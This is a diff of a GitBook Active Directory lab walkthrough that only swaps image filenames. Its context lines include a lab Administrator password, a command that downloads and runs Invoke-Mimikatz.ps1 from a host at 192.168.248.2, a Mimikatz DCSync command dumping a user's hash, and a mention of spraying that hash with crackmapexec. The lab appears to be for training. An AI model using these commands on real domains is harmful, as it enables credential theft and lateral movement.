@@ -5,7 +5,7 @@
 1. Login to `DC01` with the `Administrator` user and the password `Welcome01!`.
 2. Open the "Active Directory Users and Computers" administration tool.
 
-![](<../../.gitbook/assets/image (17).png>)
+![](<../../.gitbook/assets/image (17) (2).png>)
 
 3\. Open the "Users" directory and right click it, then select "New" and then "Users".
 
@@ -33,7 +33,7 @@
 
 12\. Enter the username secure\_admin and click "Check Names" and then click "OK".
 
-![](<../../.gitbook/assets/image (65).png>)
+![](<../../.gitbook/assets/image (65) (2).png>)
 
 13\. Click "Apply" and then "OK".
 
@@ -48,7 +48,7 @@
 net localgroup administrators "local admin data" /add
 ```
 
-![](<../../.gitbook/assets/image (64).png>)
+![](<../../.gitbook/assets/image (64) (1).png>)
 
 ## Attacking
 
@@ -105,7 +105,7 @@ iex (iwr http://192.168.248.2:8090/Invoke-Mimikatz.ps1 -UseBasicParsing)
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:bank\secure_admin /domain:bank.local"'
 ```
 
-![](<../../.gitbook/assets/image (16).png>)
+![](<../../.gitbook/assets/image (16) (1).png>)
 
 7\. The next step would be to spray this hash against all systems of the secure.local domain. But its just easier to spray it against the whole subnet with crackmapexec. To do this we use the following command:
 
